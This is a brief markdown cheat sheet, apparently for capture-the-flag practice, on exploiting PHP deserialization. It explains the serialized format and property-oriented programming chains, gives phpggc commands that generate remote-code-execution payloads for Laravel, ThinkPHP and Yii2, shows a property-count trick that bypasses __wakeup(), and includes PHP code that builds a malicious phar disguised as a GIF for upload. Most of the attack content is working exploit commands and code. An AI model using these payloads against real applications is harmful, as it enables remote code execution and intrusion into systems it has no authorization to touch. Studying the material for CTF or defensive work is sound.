# PHP Deserialization

## Detection
- Look for `unserialize()` in source code
- Check cookies, POST data for serialized PHP objects (`O:4:"User":2:{...}`)
- Look for `__wakeup()`, `__destruct()`, `__toString()` magic methods

## Serialized Format
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
// O:ClassNameLength:"ClassName":PropertyCount:{properties}
// s:length:"string"  i:integer  b:boolean  a:ArrayLength:{...}
```

## POP Chain (Property Oriented Programming)
Find a chain of magic methods:
1. `__wakeup()` or `__destruct()` as entry point
2. Chain through `__toString()`, `__call()`, `__get()`
3. Reach dangerous sink: `system()`, `exec()`, `file_get_contents()`, `eval()`

## Common Gadget Chains
### Laravel
```bash
# Use phpggc
phpggc Laravel/RCE1 system "cat /flag" | base64
phpggc Laravel/RCE5 "system" "cat /flag" | base64
phpggc Laravel/RCE6 "system" "cat /flag" | base64
```

### ThinkPHP
```bash
phpggc ThinkPHP/RCE1 system "cat /flag" | base64
```

### Yii2
```bash
phpggc Yii2/RCE1 system "cat /flag" | base64
```

## Bypass __wakeup()
If `__wakeup()` blocks exploitation, increase the property count:
```
O:4:"User":3:{...}  // Change 2 to 3 (CVE-2016-7124, PHP < 5.6.25 / 7.0.10)
```

## Phar Deserialization
Trigger deserialization via `phar://` wrapper:
1. Create phar with malicious metadata
2. Upload it (rename to .jpg/.gif if needed)
3. Trigger via file operations: `file_exists('phar://uploads/evil.jpg')`

```php
<?php
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$o = new VulnerableClass();
$o->cmd = 'cat /flag';
$phar->setMetadata($o);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>
```
